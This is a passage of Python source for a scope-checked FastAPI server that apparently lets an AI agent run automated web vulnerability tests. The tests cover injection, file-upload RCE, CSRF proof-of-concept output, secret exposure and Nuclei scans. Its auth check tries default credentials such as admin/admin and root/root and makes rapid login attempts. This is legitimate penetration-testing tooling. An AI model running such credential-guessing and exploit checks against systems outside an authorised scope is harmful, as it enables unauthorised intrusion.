        if req.upload_endpoint:
            discovery_data["api_endpoints"] = [{"url": req.upload_endpoint, "method": "POST"}]
        result = validate_file_upload(discovery_data, callback_server_url)
    except Exception as e:
        raise HTTPException(
            status_code=500,
            detail=f"File upload tester failed: {e}",
        )
    
    # Save results
    ts = int(time.time())
    host_key = host.replace(":", "_").replace("/", "_")
    out_name = f"file_upload_{host_key}_{ts}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)
    
    # Extract bypass methods, uploaded files, and RCE confirmation from findings
    bypass_methods = []
    uploaded_files = []
    rce_confirmed = False
    if result.get("findings"):
        for finding in result.get("findings", []):
            if finding.get("bypass_methods"):
                bypass_methods.extend(finding.get("bypass_methods", []))
            if finding.get("uploaded_files"):
                uploaded_files.extend(finding.get("uploaded_files", []))
            if finding.get("rce_confirmed") or finding.get("type") == "file_upload_callback_confirmed":
                rce_confirmed = True
    
    findings = {
        "target_url": req.target_url,
        "upload_endpoint": req.upload_endpoint,
        "vulnerable": result.get("vulnerable", False),
        "bypass_methods": list(set(bypass_methods)),  # Deduplicate
        "uploaded_files": uploaded_files,
        "rce_confirmed": rce_confirmed,
        "findings": result.get("findings", []),
        "timestamp": ts,
    }
    
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(findings, fh, indent=2)
    
    return FileUploadResult(
        target_url=req.target_url,
        findings_file=out_path,
        vulnerable=result.get("vulnerable", False),
        bypass_methods=list(set(bypass_methods)),
        uploaded_files=uploaded_files,
        rce_confirmed=rce_confirmed,
        meta={
            "upload_endpoint": req.upload_endpoint or "auto-discovered",
            "tests_run": result.get("tests_run", 0),
            "findings_count": len(result.get("findings", [])),
            "callback_used": callback_server_url is not None,
        }
    )


@app.post("/mcp/run_csrf_checks", response_model=CsrfChecksResult)
def run_csrf_checks(req: CsrfChecksRequest):
    """Run CSRF vulnerability checks."""
    _enforce_scope(req.host)
    try:
        from tools.csrf_tester import validate_csrf
        from tools.csrf_discovery import discover_state_changing_endpoints
        
        discovery_data = discover_state_changing_endpoints(f"https://{req.host}", {"api_endpoints": req.endpoints} if req.endpoints else None)
        result = validate_csrf(discovery_data, req.auth_context)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"CSRF tester failed: {e}")
    
    ts = int(time.time())
    host_key = req.host.replace(":", "_")
    out_path = os.path.join(OUTPUT_DIR, f"csrf_{host_key}_{ts}.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)
    
    return CsrfChecksResult(
        host=req.host,
        findings_file=out_path,
        vulnerable_endpoints=[f for f in result.get("findings", []) if f.get("vulnerable")],
        poc_html=result.get("poc_html", []),
        meta={"tests_run": result.get("tests_run", 0)}
    )


@app.post("/mcp/run_secret_exposure_checks", response_model=SecretExposureResult)
def run_secret_exposure_checks(req: SecretExposureRequest):
    """Run secret exposure checks."""
    _enforce_scope(req.host)
    try:
        from tools.secret_exposure_tester import validate_secret_exposure
        # Construct proper URL - use http:// for localhost, https:// for others
        if req.host.startswith("localhost") or req.host.startswith("127.0.0.1"):
            target_url = f"http://{req.host}"
        else:
            target_url = f"https://{req.host}"
        result = validate_secret_exposure(target_url, req.scan_js, req.scan_responses, req.validate_secrets)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Secret exposure tester failed: {e}")
    
    ts = int(time.time())
    host_key = req.host.replace(":", "_")
    out_path = os.path.join(OUTPUT_DIR, f"secret_exposure_{host_key}_{ts}.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)
    
    return SecretExposureResult(
        host=req.host,
        findings_file=out_path,
        secrets_found=result.get("secrets_found", []),
        validated_secrets=result.get("validated_secrets", []),
        severity=result.get("severity", "low"),
        meta={"high_severity_count": result.get("high_severity_count", 0)}
    )


@app.post("/mcp/run_nosql_injection_checks", response_model=NoSqlInjectionResult)
def run_nosql_injection_checks(req: NoSqlInjectionRequest):
    """Run NoSQL injection checks."""
    from urllib.parse import urlparse
    parsed = urlparse(req.target_url)
    host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
    _enforce_scope(host)
    
    callback_server_url = None
    if req.use_callback:
        callback_server_url = os.environ.get("CALLBACK_SERVER_URL")
    
    try:
        from tools.nosql_injection_tester import validate_nosql_injection
        result = validate_nosql_injection({"target": req.target_url}, callback_server_url)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"NoSQL injection tester failed: {e}")
    
    ts = int(time.time())
    host_key = host.replace(":", "_")
    out_path = os.path.join(OUTPUT_DIR, f"nosql_injection_{host_key}_{ts}.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)
    
    db_type = None
    injection_method = None
    if result.get("findings"):
        finding = result["findings"][0]
        db_type = finding.get("db_type")
        injection_method = finding.get("injection_method")
    
    return NoSqlInjectionResult(
        target_url=req.target_url,
        findings_file=out_path,
        vulnerable=result.get("vulnerable", False),
        db_type=db_type,
        injection_method=injection_method,
        meta={"tests_run": result.get("tests_run", 0), "callback_used": callback_server_url is not None}
    )


@app.post("/mcp/run_ldap_injection_checks", response_model=LdapInjectionResult)
def run_ldap_injection_checks(req: LdapInjectionRequest):
    """Run LDAP injection checks."""
    from urllib.parse import urlparse
    parsed = urlparse(req.target_url)
    host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
    _enforce_scope(host)
    
    try:
        from tools.ldap_injection_tester import validate_ldap_injection
        result = validate_ldap_injection({"target": req.target_url})
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"LDAP injection tester failed: {e}")
    
    ts = int(time.time())
    host_key = host.replace(":", "_")
    out_path = os.path.join(OUTPUT_DIR, f"ldap_injection_{host_key}_{ts}.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)
    
    injection_method = None
    auth_bypass = False
    if result.get("findings"):
        finding = result["findings"][0]
        injection_method = finding.get("injection_method")
        auth_bypass = finding.get("auth_bypass", False)
    
    return LdapInjectionResult(
        target_url=req.target_url,
        findings_file=out_path,
        vulnerable=result.get("vulnerable", False),
        injection_method=injection_method,
        auth_bypass=auth_bypass,
        meta={"tests_run": result.get("tests_run", 0)}
    )


@app.post("/mcp/run_mass_assignment_checks", response_model=MassAssignmentResult)
def run_mass_assignment_checks(req: MassAssignmentRequest):
    """Run mass assignment checks."""
    from urllib.parse import urlparse
    parsed = urlparse(req.target_url)
    host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
    _enforce_scope(host)
    
    try:
        from tools.mass_assignment_tester import validate_mass_assignment
        result = validate_mass_assignment({"target": req.target_url, "api_endpoints": [{"url": req.endpoint, "method": "POST"}]})
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Mass assignment tester failed: {e}")
    
    ts = int(time.time())
    host_key = host.replace(":", "_")
    out_path = os.path.join(OUTPUT_DIR, f"mass_assignment_{host_key}_{ts}.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)
    
    manipulated_fields = []
    privilege_escalation = False
    if result.get("findings"):
        finding = result["findings"][0]
        manipulated_fields = finding.get("manipulated_fields", [])
        privilege_escalation = finding.get("privilege_escalation", False)
    
    return MassAssignmentResult(
        target_url=req.target_url,
        findings_file=out_path,
        vulnerable=result.get("vulnerable", False),
        manipulated_fields=manipulated_fields,
        privilege_escalation=privilege_escalation,
        meta={"tests_run": result.get("tests_run", 0)}
    )


@app.post("/mcp/run_websocket_checks", response_model=WebSocketChecksResult)
def run_websocket_checks(req: WebSocketChecksRequest):
    """Run WebSocket security checks."""
    from urllib.parse import urlparse
    parsed = urlparse(req.endpoint)
    host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
    _enforce_scope(host)
    
    try:
        from tools.websocket_security_tester import validate_websocket_security
        import asyncio
        result = asyncio.run(validate_websocket_security({"websocket_endpoints": [req.endpoint]}))
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"WebSocket tester failed: {e}")
    
    ts = int(time.time())
    host_key = host.replace(":", "_")
    out_path = os.path.join(OUTPUT_DIR, f"websocket_{host_key}_{ts}.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)
    
    issues = []
    if result.get("findings"):
        issues = result["findings"][0].get("issues", [])
    
    return WebSocketChecksResult(
        endpoint=req.endpoint,
        findings_file=out_path,
        vulnerable=result.get("vulnerable", False),
        issues=issues,
        meta={"tests_run": result.get("tests_run", 0)}
    )


@app.post("/mcp/run_ssi_injection_checks", response_model=SsiInjectionResult)
def run_ssi_injection_checks(req: SsiInjectionRequest):
    """Run SSI injection checks."""
    from urllib.parse import urlparse
    parsed = urlparse(req.target_url)
    host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
    _enforce_scope(host)
    
    callback_server_url = None
    if req.use_callback:
        callback_server_url = os.environ.get("CALLBACK_SERVER_URL")
    
    try:
        from tools.ssi_injection_tester import validate_ssi_injection
        result = validate_ssi_injection({"target": req.target_url}, callback_server_url)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"SSI injection tester failed: {e}")
    
    ts = int(time.time())
    host_key = host.replace(":", "_")
    out_path = os.path.join(OUTPUT_DIR, f"ssi_injection_{host_key}_{ts}.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)
    
    injection_method = None
    rce_confirmed = False
    if result.get("findings"):
        finding = result["findings"][0]
        injection_method = finding.get("injection_method")
        rce_confirmed = finding.get("rce_confirmed", False)
    
    return SsiInjectionResult(
        target_url=req.target_url,
        findings_file=out_path,
        vulnerable=result.get("vulnerable", False),
        injection_method=injection_method,
        rce_confirmed=rce_confirmed,
        meta={"tests_run": result.get("tests_run", 0), "callback_used": callback_server_url is not None}
    )


@app.post("/mcp/run_crypto_checks", response_model=CryptoChecksResult)
def run_crypto_checks(req: CryptoChecksRequest):
    """Run cryptographic weakness checks."""
    from urllib.parse import urlparse
    parsed = urlparse(req.target_url)
    host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
    _enforce_scope(host)
    
    try:
        from tools.crypto_weakness_tester import validate_crypto_weakness
        result = validate_crypto_weakness({"target": req.target_url, "tokens": req.tokens, "cookies": req.cookies})
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Crypto weakness tester failed: {e}")
    
    ts = int(time.time())
    host_key = host.replace(":", "_")
    out_path = os.path.join(OUTPUT_DIR, f"crypto_{host_key}_{ts}.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)
    
    weak_algorithms = []
    predictable_tokens = []
    if result.get("findings"):
        finding = result["findings"][0]
        weak_algorithms = finding.get("weak_algorithms", [])
        predictable_tokens = finding.get("predictable_tokens", [])
    
    return CryptoChecksResult(
        target_url=req.target_url,
        findings_file=out_path,
        weak_algorithms=weak_algorithms,
        predictable_tokens=predictable_tokens,
        meta={"tests_run": result.get("tests_run", 0)}
    )


@app.post("/mcp/run_parameter_pollution_checks", response_model=ParameterPollutionResult)
def run_parameter_pollution_checks(req: ParameterPollutionRequest):
    """Run parameter pollution checks."""
    from urllib.parse import urlparse
    parsed = urlparse(req.target_url)
    host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
    _enforce_scope(host)
    
    try:
        from tools.parameter_pollution_tester import validate_parameter_pollution
        result = validate_parameter_pollution({"target": req.target_url})
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Parameter pollution tester failed: {e}")
    
    ts = int(time.time())
    host_key = host.replace(":", "_")
    out_path = os.path.join(OUTPUT_DIR, f"parameter_pollution_{host_key}_{ts}.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)
    
    pollution_method = None
    if result.get("findings"):
        pollution_method = result["findings"][0].get("pollution_method")
    
    return ParameterPollutionResult(
        target_url=req.target_url,
        findings_file=out_path,
        vulnerable=result.get("vulnerable", False),
        pollution_method=pollution_method,
        meta={"tests_run": result.get("tests_run", 0)}
    )


@app.post("/mcp/run_dns_rebinding_checks", response_model=DnsRebindingResult)
def run_dns_rebinding_checks(req: DnsRebindingRequest):
    """Run DNS rebinding checks."""
    from urllib.parse import urlparse
    parsed = urlparse(req.target_url)
    host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
    _enforce_scope(host)
    
    try:
        from tools.dns_rebinding_tester import validate_dns_rebinding
        result = validate_dns_rebinding({"target": req.target_url})
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"DNS rebinding tester failed: {e}")
    
    ts = int(time.time())
    host_key = host.replace(":", "_")
    out_path = os.path.join(OUTPUT_DIR, f"dns_rebinding_{host_key}_{ts}.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)
    
    internal_access = False
    if result.get("findings"):
        internal_access = result["findings"][0].get("internal_access", False)
    
    return DnsRebindingResult(
        target_url=req.target_url,
        findings_file=out_path,
        vulnerable=result.get("vulnerable", False),
        internal_access=internal_access,
        meta={"tests_run": result.get("tests_run", 0)}
    )


@app.post("/mcp/run_cache_poisoning_checks", response_model=CachePoisoningResult)
def run_cache_poisoning_checks(req: CachePoisoningRequest):
    """Run cache poisoning checks."""
    from urllib.parse import urlparse
    parsed = urlparse(req.target_url)
    host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
    _enforce_scope(host)
    
    try:
        from tools.cache_poisoning_tester import validate_cache_poisoning
        result = validate_cache_poisoning({"target": req.target_url})
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Cache poisoning tester failed: {e}")
    
    ts = int(time.time())
    host_key = host.replace(":", "_")
    out_path = os.path.join(OUTPUT_DIR, f"cache_poisoning_{host_key}_{ts}.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)
    
    poisoning_method = None
    if result.get("findings"):
        poisoning_method = result["findings"][0].get("poisoning_method")
    
    return CachePoisoningResult(
        target_url=req.target_url,
        findings_file=out_path,
        vulnerable=result.get("vulnerable", False),
        poisoning_method=poisoning_method,
        meta={"tests_run": result.get("tests_run", 0)}
    )


@app.post("/mcp/run_random_generation_checks", response_model=RandomGenerationResult)
def run_random_generation_checks(req: RandomGenerationRequest):
    """Run random number generation checks."""
    from urllib.parse import urlparse
    parsed = urlparse(req.target_url)
    host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
    _enforce_scope(host)
    
    try:
        from tools.random_generation_tester import validate_random_generation
        result = validate_random_generation({"target": req.target_url, "tokens": req.tokens, "auth_context": req.auth_context})
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Random generation tester failed: {e}")
    
    ts = int(time.time())
    host_key = host.replace(":", "_")
    out_path = os.path.join(OUTPUT_DIR, f"random_generation_{host_key}_{ts}.json")
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2)
    
    token_type = None
    if result.get("findings"):
        token_type = result["findings"][0].get("token_type")
    
    return RandomGenerationResult(
        target_url=req.target_url,
        findings_file=out_path,
        predictable=result.get("vulnerable", False),
        token_type=token_type,
        meta={"tests_run": result.get("tests_run", 0)}
    )


@app.post("/mcp/validate_poc_with_browser", response_model=BrowserPOCValidationResult)
def validate_poc_with_browser(req: BrowserPOCValidationRequest):
    """Validate PoC with browser automation."""
    # Extract host from finding URL for scope enforcement
    finding = req.finding
    url = finding.get("url") or finding.get("_raw_finding", {}).get("url", "")
    if url:
        from urllib.parse import urlparse
        parsed = urlparse(url)
        host = parsed.netloc.split(":")[0] if parsed.netloc else parsed.path.split("/")[0]
        _enforce_scope(host)
    
    try:
        from tools.poc_browser_validator import BrowserPOCValidator
        validator = BrowserPOCValidator(
            devtools_port=req.devtools_port,
            screenshot_timeout=req.wait_timeout
        )
        result = validator.validate_finding_with_browser(
            finding=req.finding,
            devtools_url=req.devtools_url,
            devtools_port=req.devtools_port,
            wait_timeout=req.wait_timeout,
        )
        return BrowserPOCValidationResult(
            validated=result.get("validated", False),
            screenshot_path=result.get("screenshot_path"),
            console_logs=result.get("console_logs", []),
            visual_indicators=result.get("visual_indicators", []),
            page_content=result.get("page_content"),
            error=result.get("error"),
        )
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Browser PoC validation failed: {e}")


@app.post("/mcp/run_auth_checks", response_model=AuthChecksResult)
def run_auth_checks(req: AuthChecksRequest):
    """
    Run comprehensive authentication security checks.
    
    Tests for:
    1. Default credentials (admin/admin, etc.)
    2. Username enumeration (different error messages)
    3. Rate limiting on login
    4. Cookie security flags (HttpOnly, Secure)
    5. Session token predictability
    """
    host = _enforce_scope(req.target)
    base_url = f"http://{host}" if "://" not in host else req.target
    login_url = base_url.rstrip("/") + (req.login_url or "/login")
    
    checks_run = 0
    confirmed_issues: List[Dict[str, Any]] = []
    
    # Default credentials to test
    default_creds = req.default_creds_list or [
        {"username": "admin", "password": "admin"},
        {"username": "admin", "password": "password"},
        {"username": "admin", "password": "123456"},
        {"username": "root", "password": "root"},
        {"username": "test", "password": "test"},
        {"username": "user", "password": "user"},
        {"username": "guest", "password": "guest"},
    ]
    
    # Test 1: Default credentials
    for creds in default_creds:
        checks_run += 1
        try:
            rate_limit_wait()
            resp = requests.post(login_url, json=creds, timeout=10)
            
            if resp.status_code == 200:
                data = resp.json()
                if data.get("success") or data.get("token") or data.get("session_id"):
                    confirmed_issues.append({
                        "type": "default_credentials",
                        "username": creds["username"],
                        "password": creds["password"],
                        "confidence": "critical",
                        "note": f"Default credentials work: {creds['username']}/{creds['password']}",
                    })
                    break  # Found one, stop testing defaults
        except Exception:
            pass
    
    # Test 2: Username enumeration
    checks_run += 2
    try:
        # Test with known user (admin is common)
        rate_limit_wait()
        resp_valid = requests.post(login_url, json={"username": "admin", "password": "wrongpassword123"}, timeout=10)
        
        rate_limit_wait()
        resp_invalid = requests.post(login_url, json={"username": "nonexistent_user_xyz", "password": "wrongpassword123"}, timeout=10)
        
        if resp_valid.status_code == 401 and resp_invalid.status_code == 401:
            try:
                msg_valid = resp_valid.json().get("error", resp_valid.text)
                msg_invalid = resp_invalid.json().get("error", resp_invalid.text)
                
                if msg_valid != msg_invalid:
                    confirmed_issues.append({
                        "type": "username_enumeration",
                        "valid_user_error": msg_valid,
                        "invalid_user_error": msg_invalid,
                        "confidence": "medium",
                        "note": "Different error messages reveal valid usernames",
                    })
            except:
                pass
    except Exception:
        pass
    
    # Test 3: Rate limiting
    checks_run += 1
    rate_limit_detected = False
    try:
        # Send rapid login attempts
        for i in range(20):
            resp = requests.post(
                login_url, 
                json={"username": "admin", "password": f"wrong{i}"}, 
                timeout=5
            )
            if resp.status_code in (429, 503) or "rate" in resp.text.lower() or "too many" in resp.text.lower():
                rate_limit_detected = True
                break
        
        if not rate_limit_detected:
            confirmed_issues.append({
                "type": "missing_rate_limit",
                "endpoint": login_url,
                "attempts": 20,
                "confidence": "medium",
                "note": "No rate limiting detected after 20 rapid login attempts",
            })
    except Exception:
        pass
    
    # Test 4: Cookie security flags
    checks_run += 1
    try:
        # Try to login to get cookies
        for creds in [{"username": "admin", "password": "admin"}, {"username": "test", "password": "test"}]:
            rate_limit_wait()
            resp = requests.post(login_url, json=creds, timeout=10)
            
            if resp.status_code == 200 and resp.cookies:
                for cookie in resp.cookies:
                    cookie_issues = []
                    
                    # Check for missing flags
                    cookie_str = resp.headers.get("Set-Cookie", "")
                    
                    if "httponly" not in cookie_str.lower():
                        cookie_issues.append("HttpOnly")
                    if "secure" not in cookie_str.lower():
                        cookie_issues.append("Secure")
                    if "samesite" not in cookie_str.lower():
                        cookie_issues.append("SameSite")
                    
                    if cookie_issues:
                        confirmed_issues.append({
                            "type": "insecure_cookie",
                            "cookie_name": cookie.name,
                            "missing_flags": cookie_issues,
                            "confidence": "medium",
                            "note": f"Cookie '{cookie.name}' missing security flags: {', '.join(cookie_issues)}",
                        })
                break  # Only need to test cookies once
    except Exception:
        pass
    
    # Test 5: Session token predictability
    checks_run += 1
    session_ids = []
    try:
        # Get multiple session IDs
        for _ in range(3):
            # Try quick login endpoints
            for quick_url in ["/login/admin", "/login/alice", "/login/test"]:
                try:
                    rate_limit_wait()
                    resp = requests.get(base_url.rstrip("/") + quick_url, timeout=10)
                    if resp.status_code == 200:
                        data = resp.json()
                        session_id = data.get("session_id")
                        if session_id:
                            session_ids.append(session_id)
                            break
                except:
                    pass
        
        # Analyze session IDs for predictability
        if len(session_ids) >= 2:
            # Check for sequential patterns
            import re
            numbers = []
            for sid in session_ids:
                match = re.search(r'(\d+)', sid)
                if match:
                    numbers.append(int(match.group(1)))
            
            if len(numbers) >= 2:
                # Check if sequential
                diffs = [numbers[i+1] - numbers[i] for i in range(len(numbers)-1)]
                if all(d == 1 for d in diffs):
                    confirmed_issues.append({
                        "type": "predictable_session",
                        "session_ids": session_ids,
                        "confidence": "high",
                        "note": "Session IDs appear to be sequential/predictable",
                    })
    except Exception:
        pass
    
    # Build summary
    if confirmed_issues:
        summary = f"Found {len(confirmed_issues)} authentication issue(s)"
        by_type = {}
        for issue in confirmed_issues:
            t = issue.get("type", "unknown")
            by_type[t] = by_type.get(t, 0) + 1
        summary += f"; Types: {by_type}"
    else:
        summary = "No authentication vulnerabilities detected"
    
    # Save results
    ts = int(time.time())
    host_key = host.replace(":", "_").replace("/", "_")
    out_name = f"auth_checks_{host_key}_{ts}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)
    
    results = {
        "target": req.target,
        "login_url": login_url,
        "checks_run": checks_run,
        "confirmed_issues": confirmed_issues,
        "summary": summary,
    }
    
    with open(out_path, "w", encoding="utf-8") as fh:
        json.dump(results, fh, indent=2)
    
    return AuthChecksResult(
        target=req.target,
        meta={
            "checks_count": checks_run,
            "confirmed_issues_count": len(confirmed_issues),
            "summary": summary,
            "findings_file": out_path,
            "issues": confirmed_issues,
        }
    )


# ---------- AI Nuclei Triage Endpoints ----------

@app.post("/mcp/triage_nuclei_templates", response_model=NucleiTriageResult)
def triage_nuclei_templates(req: NucleiTriageRequest):
    """
    AI-driven Nuclei template selection based on host_profile.

    This endpoint:
    1. Loads the latest host_profile snapshot for the given host
    2. Calls the AI triage helper to analyze technologies and attack surface
    3. Returns a curated list of templates/tags optimized for this host

    The output can be passed directly to /mcp/run_targeted_nuclei.
    """
    host = _enforce_scope(req.host)

    # Load latest host profile
    profile = _load_host_profile_snapshot(host, latest=True)
    if not profile:
        raise HTTPException(
            status_code=404,
            detail=f"No host_profile snapshot found for {host}. Run host_profile first.",
        )

    # Import and call the AI triage helper
    triage_script = os.path.join(os.path.dirname(__file__), "tools", "ai_nuclei_triage.py")
    if not os.path.exists(triage_script):
        raise HTTPException(
            status_code=500,
            detail=f"ai_nuclei_triage.py not found at {triage_script}",
        )

    # Write profile to temp file for the helper
    import tempfile
    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".json", delete=False, encoding="utf-8"
    ) as tmp:
        json.dump(profile, tmp, indent=2)
        tmp_path = tmp.name

    try:
        cmd = [
            sys.executable,
            triage_script,
            "--host-profile",
            tmp_path,
        ]
        if not req.use_llm:
            cmd.append("--no-llm")

        rate_limit_wait()
        proc = subprocess.run(
            cmd,
            cwd=os.path.dirname(__file__),
            capture_output=True,
            text=True,
            timeout=180,
        )

        if proc.returncode != 0:
            # Log error but try to parse any output
            print(f"[TRIAGE] ai_nuclei_triage.py warning: {proc.stderr}", file=sys.stderr)

        # Parse JSON output
        output = proc.stdout.strip()
        if not output:
            raise HTTPException(
                status_code=500,
                detail=f"Empty output from ai_nuclei_triage.py: {proc.stderr}",
            )

        try:
            result = json.loads(output)
        except json.JSONDecodeError as e:
            raise HTTPException(
                status_code=500,
                detail=f"Invalid JSON from ai_nuclei_triage.py: {e}\nOutput: {output[:500]}",
            )

    finally:
        # Cleanup temp file
        try:
            os.unlink(tmp_path)
        except Exception:
            pass

    return NucleiTriageResult(
        host=host,
        mode=result.get("mode", "recon"),
        templates=result.get("templates", []),
        tags=result.get("tags", []),
        exclude_tags=result.get("exclude_tags", []),
        severity_filter=result.get("severity_filter", ["critical", "high", "medium"]),
        reasoning=result.get("reasoning", ""),
    )


@app.post("/mcp/run_targeted_nuclei", response_model=TargetedNucleiResult)
def run_targeted_nuclei(req: TargetedNucleiRequest):
    """
    Run Nuclei with AI-selected templates for targeted vulnerability discovery.

    This endpoint is designed to be called after /mcp/triage_nuclei_templates
    with the templates/tags returned by the AI triage.

    Unlike the recon-only mode, this runs deeper vulnerability checks on
    specific template categories relevant to the detected technology stack.
    """
    host = _enforce_scope(req.target)

    if not req.templates:
        raise HTTPException(
            status_code=400,
            detail="No templates specified. Call /mcp/triage_nuclei_templates first.",
        )

    # Resolve template paths
    nuclei_bin = os.environ.get("NUCLEI_BIN", "nuclei")
    templates_dir = NUCLEI_TEMPLATES_DIR or os.path.expanduser("~/nuclei-templates")

    # Build nuclei command
    cmd = [nuclei_bin, "-u", req.target]

    # Add templates
    templates_used = 0
    for tmpl in req.templates:
        abs_path = os.path.join(templates_dir, tmpl) if not os.path.isabs(tmpl) else tmpl
        if os.path.exists(abs_path):
            cmd.extend(["-t", abs_path])
            templates_used += 1
        else:
            print(f"[NUCLEI] Template path not found, skipping: {abs_path}", file=sys.stderr)

    if templates_used == 0:
        raise HTTPException(
            status_code=400,
            detail=f"No valid template paths found. Check NUCLEI_TEMPLATES_DIR={templates_dir}",
        )

    # Add tags filter
    if req.tags:
        cmd.extend(["-tags", ",".join(req.tags)])

    # Add exclude tags
    if req.exclude_tags:
        cmd.extend(["-etags", ",".join(req.exclude_tags)])

    # Add severity filter
    if req.severity:
        cmd.extend(["-severity", ",".join(req.severity)])

    # Output configuration
    ts = int(time.time())
    host_key = host.replace(":", "_").replace("/", "_")
    out_name = f"targeted_nuclei_{host_key}_{ts}.json"
    out_path = os.path.join(OUTPUT_DIR, out_name)

    cmd.extend(["-jsonl", "-silent", "-o", out_path])

    print(f"[NUCLEI] Running targeted scan: {' '.join(cmd)}", file=sys.stderr)

    rate_limit_wait()
    try:
        proc = subprocess.run(
            cmd,
            cwd=os.path.dirname(__file__),
            capture_output=True,
            text=True,
            timeout=3600,  # 1 hour timeout for deep scans
        )
    except subprocess.TimeoutExpired:
        raise HTTPException(status_code=500, detail="Nuclei scan timed out (1 hour)")
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error running nuclei: {e}")

    if proc.returncode != 0 and not os.path.exists(out_path):
        raise HTTPException(
            status_code=500,
            detail=f"Nuclei failed: {proc.stderr.strip()}",
        )

    # Count findings
    findings_count = 0
    if os.path.exists(out_path):
        with open(out_path, "r", encoding="utf-8") as fh:
            for line in fh:
                if line.strip():
                    findings_count += 1

    return TargetedNucleiResult(
        target=req.target,
        findings_count=findings_count,
        findings_file=out_path,
        templates_used=templates_used,
    )


# ---------- Quick Win Discovery Endpoints ----------

@app.post("/mcp/run_security_headers", response_model=SecurityHeadersResult)
def run_security_headers(req: SecurityHeadersRequest):
    """Analyze security headers for misconfigurations and missing protections.

    Checks for:
    - Content-Security-Policy (CSP) presence and strength
    - Strict-Transport-Security (HSTS) configuration
    - X-Frame-Options, X-Content-Type-Options
    - Referrer-Policy, Permissions-Policy
    - Other security-related headers

    Missing or weak CSP often enables XSS, making this a high-value check.
    """
    # Validate URL is in scope
    validated_host = _enforce_scope(req.url)
    
    # Reconstruct safe URL (similar to run_whatweb)
    parsed = urlparse(req.url)
    scheme = parsed.scheme or "http"
    safe_url = f"{scheme}://{validated_host}"
    if parsed.port and parsed.port not in (80, 443):
        safe_url = f"{scheme}://{validated_host}:{parsed.port}"
    if parsed.path:
        safe_url += parsed.path

    rate_limit_wait()
    try:
        resp = requests.get(safe_url, timeout=15, allow_redirects=True)
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Failed to fetch URL: {e}")

    headers = dict(resp.headers)
    issues: List[SecurityHeadersIssue] = []
    score = 100  # Start with perfect score, deduct for issues

    # Check Content-Security-Policy
    csp = headers.get("Content-Security-Policy", "").lower()
    if not csp:
        issues.append(SecurityHeadersIssue(
            header="Content-Security-Policy",
            severity="high",
            issue="Missing CSP header - XSS vulnerabilities cannot be mitigated",
            recommendation="Implement a strict CSP with 'default-src' and avoid 'unsafe-inline'"
        ))
        score -= 30
    else:
        # Check for weak CSP directives
        if "unsafe-inline" in csp or "unsafe-eval" in csp:
            issues.append(SecurityHeadersIssue(
                header="Content-Security-Policy",
                severity="medium",
                issue="CSP contains unsafe directives (unsafe-inline/unsafe-eval)",
                recommendation="Remove unsafe-inline and unsafe-eval, use nonces or hashes instead"
            ))
            score -= 15
        if "*" in csp and "default-src" in csp:
            issues.append(SecurityHeadersIssue(
                header="Content-Security-Policy",
                severity="medium",
                issue="CSP uses wildcard sources which are overly permissive",
                recommendation="Specify explicit sources instead of wildcards"
            ))
            score -= 10

    # Check Strict-Transport-Security
    hsts = headers.get("Strict-Transport-Security", "")
    if not hsts:
        issues.append(SecurityHeadersIssue(
            header="Strict-Transport-Security",
            severity="medium",
            issue="Missing HSTS header - allows protocol downgrade attacks",
            recommendation="Add HSTS with max-age>=31536000 and includeSubDomains"
        ))
        score -= 15
    else:
        # Check HSTS strength
        if "max-age=0" in hsts.lower():
            issues.append(SecurityHeadersIssue(
                header="Strict-Transport-Security",
                severity="high",
                issue="HSTS max-age is 0, effectively disabling HSTS",
                recommendation="Set max-age to at least 31536000 (1 year)"
            ))
            score -= 20
        elif "max-age" in hsts.lower():
            # Extract max-age value
            import re
            match = re.search(r"max-age=(\d+)", hsts.lower())
            if match:
                max_age = int(match.group(1))
                if max_age < 31536000:
                    issues.append(SecurityHeadersIssue(
                        header="Strict-Transport-Security",
                        severity="low",
                        issue=f"HSTS max-age is {max_age} (less than recommended 31536000)",
                        recommendation="Increase max-age to at least 31536000"
